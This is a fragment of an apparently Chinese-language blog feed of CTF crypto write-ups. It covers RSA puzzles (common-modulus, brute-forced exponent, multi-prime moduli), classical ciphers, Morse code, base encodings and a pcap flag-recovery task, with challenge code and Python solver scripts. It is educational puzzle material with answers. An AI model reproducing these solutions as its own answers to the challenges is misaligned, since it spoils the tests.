class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> isPrime, sieve_base <span class="hljs-keyword">as</span> primes<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getPrime</span>(<span class="hljs-params">bits</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> n.bit_length() &lt; bits:<br>            n *= choice(primes)<br>        <span class="hljs-keyword">if</span> isPrime(n + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">0x10001</span><br>m = <span class="hljs-built_in">int</span>.from_bytes(flag.encode(), <span class="hljs-string">&#x27;big&#x27;</span>)<br>p, q = [getPrime(<span class="hljs-number">2048</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><br><span class="hljs-comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><br></code></pre></td></tr></table></figure><p>两点需要说明的<br>1、yafu是通过计算来分解N的，而factor网站是通过数据库查询来分解N的<br>这一题的N刚好在数据库中有</p><p>2、 int.from_bytes(bytes, byteorder, *, signed=False)<br>byte转换为int类型函数bytes是要转换的十六进制；<br>byteorder：选’big’和’little’，其中big代表正常顺序，ittle反之<br>signed：选True、Flase表示是否要区分二进制的正负数含义。即是否要对原二进制数进行原码反码 补码操作。</p><hr><h2 id="HDCTF2019-bbbbbbrsa"><a href="#HDCTF2019-bbbbbbrsa" class="headerlink" title="[HDCTF2019]bbbbbbrsa"></a>[HDCTF2019]bbbbbbrsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode <span class="hljs-keyword">as</span> b32encode<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert,gcd,iroot<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex,b2a_hex<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">&quot;******************************&quot;</span><br><br>nbit = <span class="hljs-number">128</span><br><br>p = getPrime(nbit)<br>q = getPrime(nbit)<br>n = p*q<br><br><span class="hljs-built_in">print</span> p<br><span class="hljs-built_in">print</span> n<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>e = random.randint(<span class="hljs-number">50000</span>,<span class="hljs-number">70000</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">if</span> gcd(e,phi) == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">else</span>:<br>e -= <span class="hljs-number">1</span>;<br><br>c = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(b2a_hex(flag),<span class="hljs-number">16</span>),e,n)<br><br><span class="hljs-built_in">print</span> b32encode(<span class="hljs-built_in">str</span>(c))[::-<span class="hljs-number">1</span>]<br><br>c=<span class="hljs-number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span><br>p = <span class="hljs-number">177077389675257695042507998165006460849</span><br>n = <span class="hljs-number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><br></code></pre></td></tr></table></figure><p>e未知，直接爆破e</p><p><font color=orange><strong>注意all_printable函数的使用</strong></font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">all_printable</span>(<span class="hljs-params">s</span>):</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x7f</span>):<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>p = <span class="hljs-number">177077389675257695042507998165006460849</span><br>n = <span class="hljs-number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>c = <span class="hljs-number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span><br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">70000</span>):<br><span class="hljs-keyword">try</span>:<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>flag=libnum.n2s(<span class="hljs-built_in">int</span>(m))<br><span class="hljs-keyword">if</span> all_printable(flag):<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><hr><h2 id="buu-RSA4"><a href="#buu-RSA4" class="headerlink" title="buu-RSA4"></a>buu-RSA4</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">N = <span class="hljs-number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span> <br>c = <span class="hljs-number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span><br><br>N = <span class="hljs-number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span> <br>c = <span class="hljs-number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span><br><br>N = <span class="hljs-number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span> <br>c = <span class="hljs-number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span><br></code></pre></td></tr></table></figure><hr><h2 id="buu-SameMod"><a href="#buu-SameMod" class="headerlink" title="buu-SameMod"></a>buu-SameMod</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;<br>&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;<br><br><span class="hljs-attribute">message1</span>=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349<br><span class="hljs-attribute">message2</span>=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535<br><br></code></pre></td></tr></table></figure><p>同模攻击，但是不一样的是m直接转换为字符串是错误的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-number">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br><br>flag=<span class="hljs-string">&quot;&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(m):<br>    <span class="hljs-keyword">if</span> m[i]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>        c=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[i:i+<span class="hljs-number">3</span>]))<br>        i+=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        c=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[i:i+<span class="hljs-number">2</span>]))<br>        i+=<span class="hljs-number">2</span><br>    flag+=c<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>m是ASCII码拼接而成！！</p><hr><h2 id="羊城杯-2020-RRRRRRRSA"><a href="#羊城杯-2020-RRRRRRRSA" class="headerlink" title="[羊城杯 2020]RRRRRRRSA"></a>[羊城杯 2020]RRRRRRRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&#x27;GWHT&#123;************&#125;&#x27;</span><br><br>flag1 = flag[:<span class="hljs-number">19</span>].encode()<br>flag2 = flag[<span class="hljs-number">19</span>:].encode()<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">38</span>)<br><br>P1 = getPrime(<span class="hljs-number">1038</span>)<br>P2 = sympy.nextprime(P1)<br><span class="hljs-keyword">assert</span>(P2 - P1 &lt; <span class="hljs-number">1000</span>)<br><br>Q1 = getPrime(<span class="hljs-number">512</span>)<br>Q2 = sympy.nextprime(Q1)<br><br>N1 = P1 * P1 * Q1<br>N2 = P2 * P2 * Q2<br><br>E1 = getPrime(<span class="hljs-number">1024</span>)<br>E2 = sympy.nextprime(E1)<br><br>m1 = bytes_to_long(flag1)<br>m2 = bytes_to_long(flag2)<br><br>c1 = <span class="hljs-built_in">pow</span>(m1, E1, N1)<br>c2 = <span class="hljs-built_in">pow</span>(m2, E2, N2)<br>N1=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347</span><br>c1=<span class="hljs-number">55094296873556883585060020895253176070835143350249581136609315815308788255684072804968957510292559743192424646169207794748893753882418256401223641287546922358162629295622258913168323493447075410872354874300793298956869374606043622559405978242734950156459436487837698668489891733875650048466360950142617732135781244969524095348835624828008115829566644654403962285001724209210887446203934276651265377137788183939798543755386888532680013170540716736656670269251318800501517579803401154996881233025210176293554542024052540093890387437964747460765498713092018160196637928204190194154199389276666685436565665236397481709703644555328705818892269499380797044554054118656321389474821224725533693520856047736578402581854165941599254178019515615183102894716647680969742744705218868455450832</span><br>E1=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820423103</span><br>N2=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868195633647431732875392121458684331843306730889424418620069322578265236351407591029338519809538995249896905137642342435659572917714183543305243715664380787797562011006398730320980994747939791561885622949912698246701769321430325902912003041678774440704056597862093530981040696872522868921139041247362592257285423948870944137019745161211585845927019259709501237550818918272189606436413992759328318871765171844153527424347985462767028135376552302463861324408178183842139330244906606776359050482977256728910278687996106152971028878653123533559760167711270265171441623056873903669918694259043580017081671349232051870716493557434517579121</span><br>c2=<span class="hljs-number">39328446140156257571484184713861319722905864197556720730852773059147902283123252767651430278357950872626778348596897711320942449693270603776870301102881405303651558719085454281142395652056217241751656631812580544180434349840236919765433122389116860827593711593732385562328255759509355298662361508611531972386995239908513273236239858854586845849686865360780290350287139092143587037396801704351692736985955152935601987758859759421886670907735120137698039900161327397951758852875291442188850946273771733011504922325622240838288097946309825051094566685479503461938502373520983684296658971700922069426788236476575236189040102848418547634290214175167767431475003216056701094275899211419979340802711684989710130215926526387138538819531199810841475218142606691152928236362534181622201347</span><br>E2=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820425393</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>N1=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347</span><br>c1=<span class="hljs-number">55094296873556883585060020895253176070835143350249581136609315815308788255684072804968957510292559743192424646169207794748893753882418256401223641287546922358162629295622258913168323493447075410872354874300793298956869374606043622559405978242734950156459436487837698668489891733875650048466360950142617732135781244969524095348835624828008115829566644654403962285001724209210887446203934276651265377137788183939798543755386888532680013170540716736656670269251318800501517579803401154996881233025210176293554542024052540093890387437964747460765498713092018160196637928204190194154199389276666685436565665236397481709703644555328705818892269499380797044554054118656321389474821224725533693520856047736578402581854165941599254178019515615183102894716647680969742744705218868455450832</span><br>E1=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820423103</span><br>p1=<span class="hljs-number">11628371843051760370952910026406764366191062991235308941262037248377376991693250742343307155422036713746576338866595433599862614339347536916226536644210947</span><br>q1=<span class="hljs-number">2274225198252001349705635635570523977229824105257244100474886998299874359980121470818908135119780772090534507154122446275044273088642034569778714650980895003300783785404556303992237495059194352539844239687490397036174178433587393753764414486675415691276936408808667228951877003555601842900641222777857711016758899</span><br><span class="hljs-built_in">print</span>(q1*q1*p1==N1)<br>phi1=(q1-<span class="hljs-number">1</span>)*q1*(p1-<span class="hljs-number">1</span>)<br>d1=gmpy2.invert(E1,phi1)<br>m1=<span class="hljs-built_in">pow</span>(c1,d1,N1)<br>flag1=libnum.n2s(<span class="hljs-built_in">int</span>(m1))<br><br>N2=<span class="hljs-number">60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868195633647431732875392121458684331843306730889424418620069322578265236351407591029338519809538995249896905137642342435659572917714183543305243715664380787797562011006398730320980994747939791561885622949912698246701769321430325902912003041678774440704056597862093530981040696872522868921139041247362592257285423948870944137019745161211585845927019259709501237550818918272189606436413992759328318871765171844153527424347985462767028135376552302463861324408178183842139330244906606776359050482977256728910278687996106152971028878653123533559760167711270265171441623056873903669918694259043580017081671349232051870716493557434517579121</span><br>c2=<span class="hljs-number">39328446140156257571484184713861319722905864197556720730852773059147902283123252767651430278357950872626778348596897711320942449693270603776870301102881405303651558719085454281142395652056217241751656631812580544180434349840236919765433122389116860827593711593732385562328255759509355298662361508611531972386995239908513273236239858854586845849686865360780290350287139092143587037396801704351692736985955152935601987758859759421886670907735120137698039900161327397951758852875291442188850946273771733011504922325622240838288097946309825051094566685479503461938502373520983684296658971700922069426788236476575236189040102848418547634290214175167767431475003216056701094275899211419979340802711684989710130215926526387138538819531199810841475218142606691152928236362534181622201347</span><br>E2=<span class="hljs-number">125932919717342481428108392434488550259190856475011752106073050593074410065655587870702051419898088541590032209854048032649625269856337901048406066968337289491951404384300466543616578679539808215698754491076340386697518948419895268049696498272031094236309803803729823608854215226233796069683774155739820425393</span><br>p2=<span class="hljs-number">11628371843051760370952910026406764366191062991235308941262037248377376991693250742343307155422036713746576338866595433599862614339347536916226536644211929</span><br>q2=<span class="hljs-number">2274225198252001349705635635570523977229824105257244100474886998299874359980121470818908135119780772090534507154122446275044273088642034569778714650980895003300783785404556303992237495059194352539844239687490397036174178433587393753764414486675415691276936408808667228951877003555601842900641222777857711016759643</span><br><span class="hljs-built_in">print</span>(p2*q2*q2==N2)<br>phi2=(q2-<span class="hljs-number">1</span>)*q2*(p2-<span class="hljs-number">1</span>)<br>d2=gmpy2.invert(E2,phi2)<br>m2=<span class="hljs-built_in">pow</span>(c2,d2,N2)<br>flag2=libnum.n2s(<span class="hljs-built_in">int</span>(m2))<br><span class="hljs-built_in">print</span>(flag1+flag2)<br></code></pre></td></tr></table></figure><p><code>N=p**2*q**3*r**5*t**7*</code><br><code>phi=(p-1)*p*q**2*(q-1)*r**4*(r-1)*t**6*(t-1)</code><br>其他没有变化，正常计算即可</p><p>这一题也是如此</p><hr><h2 id="buu-凯撒？替换？呵呵"><a href="#buu-凯撒？替换？呵呵" class="headerlink" title="buu-凯撒？替换？呵呵!"></a>buu-凯撒？替换？呵呵!</h2><p><code>MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; </code></p><p><img src="/picture/za11.png"></p><p><img src="/picture/za12.png"></p><p><a href="https://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p><hr><h2 id="buu-old-fashion"><a href="#buu-old-fashion" class="headerlink" title="buu-old-fashion"></a>buu-old-fashion</h2><p><img src="/picture/za13.png"><br>没有一点提示，同样猜测是替换<br>用上一题的在线工具解密<br><img src="/picture/za14.png"></p><hr><h2 id="buu-世上无难事"><a href="#buu-世上无难事" class="headerlink" title="buu-世上无难事"></a>buu-世上无难事</h2><p><img src="/picture/za15.png"></p><p><img src="/picture/za16.png"></p><p>还原成通顺的话，同样想到刚才的网站，解密即可</p><hr><h2 id="2018-网鼎杯-第3场-Crypto-track-hacker"><a href="#2018-网鼎杯-第3场-Crypto-track-hacker" class="headerlink" title="2018-网鼎杯-第3场-Crypto-track_hacker"></a>2018-网鼎杯-第3场-Crypto-track_hacker</h2><p>pcap文件，导出http</p><p><img src="/picture/za1.png"></p><p>唯一有意义的一段php，可以看到<br>gzcompress，进行了压缩</p><p><img src="/picture/za3.png"></p><p>追踪流得到flag.txt的内容，是base64加密的，但发现直接解密解不出，因为被压缩了</p><p><img src="/picture/za2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$st</span> = <span class="hljs-string">&quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;</span>;<br><span class="hljs-variable">$st</span> = gzuncompress(base64_decode(<span class="hljs-variable">$st</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$st</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解压缩解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#用python也可以进行解压缩，但好像有点问题</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br>flag=<span class="hljs-string">&#x27;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&#x27;</span><br>zlib.decompress(flag.decode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure><hr><h2 id="2018-网鼎杯-第3场-Crypto-Not-only-base"><a href="#2018-网鼎杯-第3场-Crypto-Not-only-base" class="headerlink" title="2018-网鼎杯-第3场-Crypto-Not_only_base"></a>2018-网鼎杯-第3场-Crypto-Not_only_base</h2><p><code>MCJIJSGKP=ZZYXZXRMU=W3YZG3ZZ==G3HQHCUS==</code><br>先栏栅解密，等号必须在后面</p><p><img src="/picture/za4.png"></p><p>所以5栏的时候，再进行base32解密(原来后面有很多个等号也可以进行base解密啊)</p><hr><h2 id="ctfshow-萌新-密码3"><a href="#ctfshow-萌新-密码3" class="headerlink" title="ctfshow-萌新 密码3"></a>ctfshow-萌新 密码3</h2><p>这个题目是有疑惑的</p><p>– — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- – – -.. -.. – -.. – -.. – – – -.. -.. -.. /– -.. – -.. -.. –/ – – – – – /– -.. -.. – -.. – /– -.. -.. –<br>这个morse密码我确实有点懵，因为感觉它既有空格又有/<br>因为morse密码是由长、短、分隔 组成的，但是这一串编码他就有了四个<br><a href="http://moersima.00cha.net/">解密网址</a>，这个网站是自动用空格作为分隔的，就可以解出来</p><hr><h2 id="ctfshow-萌新-密码-4"><a href="#ctfshow-萌新-密码-4" class="headerlink" title="ctfshow-萌新 密码#4"></a>ctfshow-萌新 密码#4</h2><p>Ao(mgHX^E)ARAnTF(J]f@&amp;lt;6”.<br>注意看这个<code>\&amp;lt;</code>    是html特殊字符 &lt;<br>需要替换之后再进行base85解码</p><hr><h2 id="WUSTCTF2020-佛说：只能四天"><a href="#WUSTCTF2020-佛说：只能四天" class="headerlink" title="[WUSTCTF2020]佛说：只能四天"></a>[WUSTCTF2020]佛说：只能四天</h2><p>凯撒默认是移3位<br>记录这一题是想说，随波逐流这个软件并不一定正确，这一题解base32时，软件解不出来<br>可以使用basecrack.py (金盾杯那篇文章有说明)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2020-BJDCTF-Crypto-rsa&quot;&gt;&lt;a href=&quot;#2020-BJDCTF-Crypto-rsa&quot; class=&quot;headerlink&quot; title=&quot;2020-BJDCTF-Crypto-rsa&quot;&gt;&lt;/a&gt;2020-BJDCTF-Crypto-r</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>hagme线上赛</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/06/hagme%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/06/hagme%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2022-02-06T14:06:17.000Z</published>
    <updated>2022-02-06T14:07:24.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Easy-RSA"><a href="#1、Easy-RSA" class="headerlink" title="1、Easy RSA"></a>1、Easy RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#题目所给代码</span><br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">c</span>):</span><br>    p 